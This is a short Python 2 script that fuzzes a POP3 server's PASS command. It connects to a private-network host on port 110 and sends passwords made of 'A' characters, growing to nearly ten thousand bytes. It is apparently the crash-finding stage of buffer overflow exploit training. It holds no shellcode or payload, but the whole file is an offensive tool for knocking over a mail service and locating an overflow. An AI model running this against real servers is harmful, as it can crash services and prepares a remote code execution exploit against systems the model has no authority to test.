#!/usr/bin/python
import socket

buffer=["A"]
count=100
while len(buffer)<=50:
	buffer.append("A"*count)
	count=count+200
print len(buffer)
for string in buffer:
	print "Fuzzing PASS with %s bytes"%len(string)
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connection=s.connect(('192.168.1.145',110))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS '+string+'\r\n')
	s.send('QUIT\r\n')
	s.close()

